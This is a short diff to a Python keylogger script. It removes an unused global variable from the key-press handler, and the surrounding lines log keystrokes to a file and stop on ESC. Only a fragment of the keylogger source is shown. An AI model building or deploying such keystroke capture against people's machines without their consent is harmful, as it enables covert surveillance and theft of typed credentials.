@@ -21,7 +21,7 @@ logging.basicConfig(filename=(dir + "/" + file), level=logging.DEBUG, format="%(
 msg = ""
 
 def on_press(key):
-    global msg, special
+    global msg
     try:
         if (key == Key.esc):
             print("ESC detected: Terminating keylogger")
